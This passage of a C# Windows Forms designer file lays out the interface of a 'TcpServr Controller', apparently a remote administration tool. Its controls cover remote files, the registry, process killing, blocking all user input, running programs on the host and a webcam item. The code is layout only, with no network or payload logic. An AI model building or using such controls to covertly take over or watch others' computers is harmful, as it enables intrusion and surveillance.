            this.label4.Text = "Window Manager";
            // 
            // button2
            // 
            this.button2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.button2.Location = new System.Drawing.Point(9, 526);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(220, 39);
            this.button2.TabIndex = 5;
            this.button2.Text = "&Files and Folders";
            this.toolTip1.SetToolTip(this.button2, "File Manager");
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button3
            // 
            this.button3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.button3.Location = new System.Drawing.Point(9, 572);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(220, 39);
            this.button3.TabIndex = 6;
            this.button3.Text = "R&egistry";
            this.toolTip1.SetToolTip(this.button3, "Registry Manager");
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // button4
            // 
            this.button4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.button4.Location = new System.Drawing.Point(9, 617);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(220, 39);
            this.button4.TabIndex = 7;
            this.button4.Text = "Remote &User";
            this.toolTip1.SetToolTip(this.button4, "Remote User Manager");
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // backgroundWorker1
            // 
            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
            this.backgroundWorker1.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
            // 
            // backgroundWorker2
            // 
            this.backgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker2_DoWork);
            this.backgroundWorker2.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
            // 
            // addressBar
            // 
            this.addressBar.AcceptsReturn = true;
            this.addressBar.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.addressBar.HideSelection = false;
            this.addressBar.Location = new System.Drawing.Point(298, 111);
            this.addressBar.Name = "addressBar";
            this.addressBar.Size = new System.Drawing.Size(478, 23);
            this.addressBar.TabIndex = 10;
            this.toolTip1.SetToolTip(this.addressBar, "The current directory path");
            this.addressBar.Visible = false;
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.refreshButton);
            this.groupBox3.Controls.Add(this.cutButton);
            this.groupBox3.Controls.Add(this.recycleButton);
            this.groupBox3.Controls.Add(this.pasteButton);
            this.groupBox3.Controls.Add(this.copyButton);
            this.groupBox3.Controls.Add(this.deleteButton);
            this.groupBox3.Controls.Add(this.newFolderButton);
            this.groupBox3.Controls.Add(this.renameButton);
            this.groupBox3.Location = new System.Drawing.Point(365, 27);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(444, 79);
            this.groupBox3.TabIndex = 9;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Remote Management";
            this.groupBox3.Visible = false;
            // 
            // refreshButton
            // 
            this.refreshButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.refreshButton.Image = global::Tcpclient.Properties.Resources.refresh;
            this.refreshButton.Location = new System.Drawing.Point(7, 21);
            this.refreshButton.Name = "refreshButton";
            this.refreshButton.Size = new System.Drawing.Size(48, 48);
            this.refreshButton.TabIndex = 1;
            this.toolTip1.SetToolTip(this.refreshButton, "Refresh");
            this.refreshButton.UseVisualStyleBackColor = true;
            // 
            // cutButton
            // 
            this.cutButton.Enabled = false;
            this.cutButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cutButton.Image = global::Tcpclient.Properties.Resources.cut;
            this.cutButton.Location = new System.Drawing.Point(331, 21);
            this.cutButton.Name = "cutButton";
            this.cutButton.Size = new System.Drawing.Size(48, 48);
            this.cutButton.TabIndex = 7;
            this.toolTip1.SetToolTip(this.cutButton, "Adds the item to the local clipboard to be moved later");
            this.cutButton.UseVisualStyleBackColor = true;
            // 
            // recycleButton
            // 
            this.recycleButton.Enabled = false;
            this.recycleButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.recycleButton.Image = global::Tcpclient.Properties.Resources.recycle;
            this.recycleButton.Location = new System.Drawing.Point(115, 21);
            this.recycleButton.Name = "recycleButton";
            this.recycleButton.Size = new System.Drawing.Size(48, 48);
            this.recycleButton.TabIndex = 3;
            this.toolTip1.SetToolTip(this.recycleButton, "Recycle the item on the remote machine");
            this.recycleButton.UseVisualStyleBackColor = true;
            // 
            // pasteButton
            // 
            this.pasteButton.Enabled = false;
            this.pasteButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.pasteButton.Image = global::Tcpclient.Properties.Resources.paste;
            this.pasteButton.Location = new System.Drawing.Point(385, 21);
            this.pasteButton.Name = "pasteButton";
            this.pasteButton.Size = new System.Drawing.Size(48, 48);
            this.pasteButton.TabIndex = 8;
            this.toolTip1.SetToolTip(this.pasteButton, "Copies or moves an item on the local clipboard");
            this.pasteButton.UseVisualStyleBackColor = true;
            // 
            // copyButton
            // 
            this.copyButton.Enabled = false;
            this.copyButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.copyButton.Image = global::Tcpclient.Properties.Resources.copy;
            this.copyButton.Location = new System.Drawing.Point(277, 21);
            this.copyButton.Name = "copyButton";
            this.copyButton.Size = new System.Drawing.Size(48, 48);
            this.copyButton.TabIndex = 6;
            this.toolTip1.SetToolTip(this.copyButton, "Copy the item to the local clipboard");
            this.copyButton.UseVisualStyleBackColor = true;
            // 
            // deleteButton
            // 
            this.deleteButton.Enabled = false;
            this.deleteButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.deleteButton.Image = ((System.Drawing.Image)(resources.GetObject("deleteButton.Image")));
            this.deleteButton.Location = new System.Drawing.Point(169, 21);
            this.deleteButton.Name = "deleteButton";
            this.deleteButton.Size = new System.Drawing.Size(48, 48);
            this.deleteButton.TabIndex = 4;
            this.toolTip1.SetToolTip(this.deleteButton, "Delete the item on the remote machine");
            this.deleteButton.UseVisualStyleBackColor = true;
            // 
            // newFolderButton
            // 
            this.newFolderButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.newFolderButton.Image = global::Tcpclient.Properties.Resources.new_folder;
            this.newFolderButton.Location = new System.Drawing.Point(61, 21);
            this.newFolderButton.Name = "newFolderButton";
            this.newFolderButton.Size = new System.Drawing.Size(48, 48);
            this.newFolderButton.TabIndex = 2;
            this.toolTip1.SetToolTip(this.newFolderButton, "Create a new folder");
            this.newFolderButton.UseVisualStyleBackColor = true;
            // 
            // renameButton
            // 
            this.renameButton.Enabled = false;
            this.renameButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.renameButton.Image = global::Tcpclient.Properties.Resources.rename;
            this.renameButton.Location = new System.Drawing.Point(223, 21);
            this.renameButton.Name = "renameButton";
            this.renameButton.Size = new System.Drawing.Size(48, 48);
            this.renameButton.TabIndex = 5;
            this.toolTip1.SetToolTip(this.renameButton, "Rename the item on the remote machine");
            this.renameButton.UseVisualStyleBackColor = true;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.downloadButton);
            this.groupBox2.Controls.Add(this.uploadButton);
            this.groupBox2.Location = new System.Drawing.Point(240, 27);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(119, 79);
            this.groupBox2.TabIndex = 8;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Download/Upload";
            this.groupBox2.Visible = false;
            // 
            // downloadButton
            // 
            this.downloadButton.Enabled = false;
            this.downloadButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.downloadButton.Image = global::Tcpclient.Properties.Resources.download;
            this.downloadButton.Location = new System.Drawing.Point(7, 22);
            this.downloadButton.Name = "downloadButton";
            this.downloadButton.Size = new System.Drawing.Size(48, 48);
            this.downloadButton.TabIndex = 1;
            this.toolTip1.SetToolTip(this.downloadButton, "Download a file from the remote machine");
            this.downloadButton.UseVisualStyleBackColor = true;
            // 
            // uploadButton
            // 
            this.uploadButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.uploadButton.Image = global::Tcpclient.Properties.Resources.upload;
            this.uploadButton.Location = new System.Drawing.Point(61, 22);
            this.uploadButton.Name = "uploadButton";
            this.uploadButton.Size = new System.Drawing.Size(48, 48);
            this.uploadButton.TabIndex = 2;
            this.toolTip1.SetToolTip(this.uploadButton, "Upload a file to the remote machine");
            this.uploadButton.UseVisualStyleBackColor = true;
            // 
            // saveFileDialog1
            // 
            this.saveFileDialog1.Filter = "All Files|*.*";
            this.saveFileDialog1.Title = "Save";
            // 
            // openFileDialog1
            // 
            this.openFileDialog1.Filter = "All Files|*.*";
            // 
            // fileManMenu
            // 
            this.fileManMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.newFolderToolStripMenuItem,
            this.toolStripSeparator7,
            this.pasteToolStripMenuItem,
            this.toolStripSeparator8,
            this.uploadToolStripMenuItem});
            this.fileManMenu.Name = "contextMenuStrip2";
            this.fileManMenu.Size = new System.Drawing.Size(135, 82);
            // 
            // newFolderToolStripMenuItem
            // 
            this.newFolderToolStripMenuItem.Name = "newFolderToolStripMenuItem";
            this.newFolderToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
            this.newFolderToolStripMenuItem.Text = "New Folder";
            // 
            // toolStripSeparator7
            // 
            this.toolStripSeparator7.Name = "toolStripSeparator7";
            this.toolStripSeparator7.Size = new System.Drawing.Size(131, 6);
            // 
            // pasteToolStripMenuItem
            // 
            this.pasteToolStripMenuItem.Enabled = false;
            this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
            this.pasteToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
            this.pasteToolStripMenuItem.Text = "Paste";
            // 
            // toolStripSeparator8
            // 
            this.toolStripSeparator8.Name = "toolStripSeparator8";
            this.toolStripSeparator8.Size = new System.Drawing.Size(131, 6);
            // 
            // uploadToolStripMenuItem
            // 
            this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
            this.uploadToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
            this.uploadToolStripMenuItem.Text = "Upload";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(243, 114);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(52, 15);
            this.label5.TabIndex = 21;
            this.label5.Text = "Address:";
            this.label5.Visible = false;
            // 
            // openFileDialog2
            // 
            this.openFileDialog2.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
            this.openFileDialog2.Title = "Open";
            // 
            // textBox3
            // 
            this.textBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox3.BackColor = System.Drawing.Color.LightGoldenrodYellow;
            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox3.Cursor = System.Windows.Forms.Cursors.Default;
            this.textBox3.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox3.ForeColor = System.Drawing.Color.Blue;
            this.textBox3.Location = new System.Drawing.Point(495, 578);
            this.textBox3.Multiline = true;
            this.textBox3.Name = "textBox3";
            this.textBox3.ReadOnly = true;
            this.textBox3.Size = new System.Drawing.Size(302, 149);
            this.textBox3.TabIndex = 22;
            this.textBox3.Visible = false;
            this.textBox3.MouseClick += new System.Windows.Forms.MouseEventHandler(this.textBox3_MouseClick);
            // 
            // timer2
            // 
            this.timer2.Interval = 5000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // fileMenu
            // 
            this.fileMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.openToolStripMenuItem,
            this.runWithArgumentsToolStripMenuItem,
            this.zipToolStripMenuItem,
            this.toolStripSeparator4,
            this.downloadMenuItem,
            this.toolStripSeparator5,
            this.renameToolStripMenuItem,
            this.deleteToolStripMenuItem,
            this.copyToolStripMenuItem,
            this.cutToolStripMenuItem,
            this.toolStripSeparator6,
            this.propertiesToolStripMenuItem});
            this.fileMenu.Name = "contextMenuStrip1";
            this.fileMenu.Size = new System.Drawing.Size(145, 220);
            // 
            // openToolStripMenuItem
            // 
            this.openToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.openToolStripMenuItem.Name = "openToolStripMenuItem";
            this.openToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.openToolStripMenuItem.Text = "&Open";
            // 
            // runWithArgumentsToolStripMenuItem
            // 
            this.runWithArgumentsToolStripMenuItem.Name = "runWithArgumentsToolStripMenuItem";
            this.runWithArgumentsToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.runWithArgumentsToolStripMenuItem.Text = "&Run on host";
            this.runWithArgumentsToolStripMenuItem.Click += new System.EventHandler(this.runToolStripMenuItem_Click);
            // 
            // zipToolStripMenuItem
            // 
            this.zipToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.compressToolStripMenuItem,
            this.extractToolStripMenuItem});
            this.zipToolStripMenuItem.Name = "zipToolStripMenuItem";
            this.zipToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.zipToolStripMenuItem.Text = "Co&mpression";
            // 
            // compressToolStripMenuItem
            // 
            this.compressToolStripMenuItem.Name = "compressToolStripMenuItem";
            this.compressToolStripMenuItem.Size = new System.Drawing.Size(127, 22);
            this.compressToolStripMenuItem.Text = "Com&press";
            // 
            // extractToolStripMenuItem
            // 
            this.extractToolStripMenuItem.Name = "extractToolStripMenuItem";
            this.extractToolStripMenuItem.Size = new System.Drawing.Size(127, 22);
            this.extractToolStripMenuItem.Text = "E&xtract";
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(141, 6);
            // 
            // downloadMenuItem
            // 
            this.downloadMenuItem.Name = "downloadMenuItem";
            this.downloadMenuItem.Size = new System.Drawing.Size(144, 22);
            this.downloadMenuItem.Text = "Down&load";
            // 
            // toolStripSeparator5
            // 
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new System.Drawing.Size(141, 6);
            // 
            // renameToolStripMenuItem
            // 
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.renameToolStripMenuItem.Text = "&Rename";
            // 
            // deleteToolStripMenuItem
            // 
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.deleteToolStripMenuItem.Text = "&Delete";
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.copyToolStripMenuItem.Text = "&Copy";
            // 
            // cutToolStripMenuItem
            // 
            this.cutToolStripMenuItem.Name = "cutToolStripMenuItem";
            this.cutToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.cutToolStripMenuItem.Text = "C&ut";
            // 
            // toolStripSeparator6
            // 
            this.toolStripSeparator6.Name = "toolStripSeparator6";
            this.toolStripSeparator6.Size = new System.Drawing.Size(141, 6);
            // 
            // propertiesToolStripMenuItem
            // 
            this.propertiesToolStripMenuItem.Name = "propertiesToolStripMenuItem";
            this.propertiesToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.propertiesToolStripMenuItem.Text = "&Properties";
            // 
            // progressBar1
            // 
            this.progressBar1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.progressBar1.Location = new System.Drawing.Point(247, 466);
            this.progressBar1.Name = "progressBar1";
            this.progressBar1.Size = new System.Drawing.Size(0, 27);
            this.progressBar1.Style = System.Windows.Forms.ProgressBarStyle.Marquee;
            this.progressBar1.TabIndex = 23;
            this.progressBar1.Visible = false;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.White;
            this.label7.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.Location = new System.Drawing.Point(30, 164);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(158, 20);
            this.label7.TabIndex = 25;
            this.label7.Text = "TcpServr Controller";
            // 
            // windowMenu
            // 
            this.windowMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.viewDetailsToolStripMenuItem,
            this.toolStripSeparator10,
            this.activateToolStripMenuItem,
            this.toggleVisibilityToolStripMenuItem,
            this.toolStripSeparator11,
            this.minimizeToolStripMenuItem,
            this.maximizeToolStripMenuItem,
            this.restoreToolStripMenuItem,
            this.toolStripSeparator9,
            this.closeToolStripMenuItem});
            this.windowMenu.Name = "windowMenu";
            this.windowMenu.Size = new System.Drawing.Size(159, 176);
            // 
            // viewDetailsToolStripMenuItem
            // 
            this.viewDetailsToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.viewDetailsToolStripMenuItem.Name = "viewDetailsToolStripMenuItem";
            this.viewDetailsToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.viewDetailsToolStripMenuItem.Text = "&View Details";
            // 
            // toolStripSeparator10
            // 
            this.toolStripSeparator10.Name = "toolStripSeparator10";
            this.toolStripSeparator10.Size = new System.Drawing.Size(155, 6);
            // 
            // activateToolStripMenuItem
            // 
            this.activateToolStripMenuItem.Name = "activateToolStripMenuItem";
            this.activateToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.activateToolStripMenuItem.Text = "&Activate";
            // 
            // toggleVisibilityToolStripMenuItem
            // 
            this.toggleVisibilityToolStripMenuItem.Name = "toggleVisibilityToolStripMenuItem";
            this.toggleVisibilityToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.toggleVisibilityToolStripMenuItem.Text = "Toggle &Visibility";
            // 
            // toolStripSeparator11
            // 
            this.toolStripSeparator11.Name = "toolStripSeparator11";
            this.toolStripSeparator11.Size = new System.Drawing.Size(155, 6);
            // 
            // minimizeToolStripMenuItem
            // 
            this.minimizeToolStripMenuItem.Name = "minimizeToolStripMenuItem";
            this.minimizeToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.minimizeToolStripMenuItem.Text = "Mi&nimize";
            // 
            // maximizeToolStripMenuItem
            // 
            this.maximizeToolStripMenuItem.Name = "maximizeToolStripMenuItem";
            this.maximizeToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.maximizeToolStripMenuItem.Text = "Ma&ximize";
            // 
            // restoreToolStripMenuItem
            // 
            this.restoreToolStripMenuItem.Name = "restoreToolStripMenuItem";
            this.restoreToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.restoreToolStripMenuItem.Text = "&Restore";
            // 
            // toolStripSeparator9
            // 
            this.toolStripSeparator9.Name = "toolStripSeparator9";
            this.toolStripSeparator9.Size = new System.Drawing.Size(155, 6);
            // 
            // closeToolStripMenuItem
            // 
            this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
            this.closeToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.closeToolStripMenuItem.Text = "&Close";
            // 
            // goButton
            // 
            this.goButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.goButton.BackColor = System.Drawing.Color.Transparent;
            this.goButton.Image = global::Tcpclient.Properties.Resources.go;
            this.goButton.Location = new System.Drawing.Point(782, 109);
            this.goButton.Name = "goButton";
            this.goButton.Size = new System.Drawing.Size(26, 26);
            this.goButton.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.goButton.TabIndex = 26;
            this.goButton.TabStop = false;
            this.goButton.Visible = false;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::Tcpclient.Properties.Resources.computer;
            this.pictureBox1.Location = new System.Drawing.Point(47, 33);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(128, 128);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.pictureBox1.TabIndex = 24;
            this.pictureBox1.TabStop = false;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(820, 756);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.menuStrip1);
            this.Controls.Add(this.button4);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.goButton);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.progressBar1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.textBox3);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.addressBar);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.listView1);
            this.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.menuStrip1;
            this.Name = "Main";
            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
            this.Text = "TcpServr Controller";
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Main_FormClosing);
            this.Load += new System.EventHandler(this.Main_Load);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
            this.groupBox3.ResumeLayout(false);
            this.groupBox2.ResumeLayout(false);
            this.fileManMenu.ResumeLayout(false);
            this.fileMenu.ResumeLayout(false);
            this.windowMenu.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.goButton)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ToolStripMenuItem messagesToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem blockemToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem messageBoxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem saySomethingToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem trayTipToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem chatToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem helpToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
        private System.Windows.Forms.ComboBox comboBox2;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.ComboBox comboBox1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.NumericUpDown numericUpDown1;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        public System.Windows.Forms.ListView listView1;
        
        public System.Windows.Forms.ToolStripMenuItem runToolStripMenuItem;
        
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator1;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator2;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator3;
        public System.Windows.Forms.ToolStripMenuItem rawMessageToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem receiveConfirmationMessagesToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem softwareToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem blockProcessToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem unblockProcessToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem closeProcessToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem killProcessToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem blockAllUserInputToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem newFolderToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem pasteToolStripMenuItem;
        public System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;
        public System.Windows.Forms.TextBox textBox3;
        public System.Windows.Forms.ToolStripMenuItem openToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem runWithArgumentsToolStripMenuItem;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator4;
        public System.Windows.Forms.ToolStripMenuItem downloadMenuItem;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator5;
        public System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem copyToolStripMenuItem;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator6;
        public System.Windows.Forms.ToolStripMenuItem propertiesToolStripMenuItem;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator7;
        public System.Windows.Forms.ToolStripSeparator toolStripSeparator8;
        public System.Windows.Forms.ToolStripMenuItem uploadToolStripMenuItem;
        public System.Windows.Forms.Button button14;
        public System.Windows.Forms.Button button1;
        public System.Windows.Forms.GroupBox groupBox1;
        public System.Windows.Forms.Button button2;
        public System.Windows.Forms.Button button3;
        public System.Windows.Forms.Button button4;
        public System.Windows.Forms.TextBox addressBar;
        public System.Windows.Forms.GroupBox groupBox3;
        public System.Windows.Forms.Button pasteButton;
        public System.Windows.Forms.Button copyButton;
        public System.Windows.Forms.Button deleteButton;
        public System.Windows.Forms.Button newFolderButton;
        public System.Windows.Forms.Button renameButton;
        public System.Windows.Forms.GroupBox groupBox2;
        public System.Windows.Forms.Button downloadButton;
        public System.Windows.Forms.Button uploadButton;
        public System.Windows.Forms.Label label5;
        public System.Windows.Forms.Button recycleButton;
        public System.Windows.Forms.Button cutButton;
        public System.Windows.Forms.ProgressBar progressBar1;
        public System.Windows.Forms.Label label6;
        public System.Windows.Forms.LinkLabel linkLabel2;
        public System.Windows.Forms.LinkLabel linkLabel4;
        public System.Windows.Forms.Label label4;
        public System.Windows.Forms.MenuStrip menuStrip1;
        public System.Windows.Forms.StatusStrip statusStrip1;
        public System.Windows.Forms.Timer timer1;
        public System.ComponentModel.BackgroundWorker backgroundWorker1;
        public System.ComponentModel.BackgroundWorker backgroundWorker2;
        public System.Windows.Forms.SaveFileDialog saveFileDialog1;
        public System.Windows.Forms.ImageList imageList1;
        public System.Windows.Forms.OpenFileDialog openFileDialog1;
        public System.Windows.Forms.ContextMenuStrip fileManMenu;
        public System.Windows.Forms.OpenFileDialog openFileDialog2;
        public System.ComponentModel.BackgroundWorker backgroundWorker3;
        public System.Windows.Forms.Timer timer2;
        public System.Windows.Forms.ContextMenuStrip fileMenu;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label7;
        public System.Windows.Forms.ToolStripMenuItem cutToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem zipToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem extractToolStripMenuItem;
        public System.Windows.Forms.ToolStripMenuItem compressToolStripMenuItem;
        public System.Windows.Forms.Button refreshButton;
        private System.Windows.Forms.ToolTip toolTip1;
        private System.Windows.Forms.ContextMenuStrip windowMenu;
        private System.Windows.Forms.ToolStripMenuItem viewDetailsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem activateToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem closeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toggleVisibilityToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator9;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator10;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator11;
        private System.Windows.Forms.ToolStripMenuItem minimizeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem maximizeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restoreToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator12;
        private System.Windows.Forms.ToolStripMenuItem webCamToolStripMenuItem;
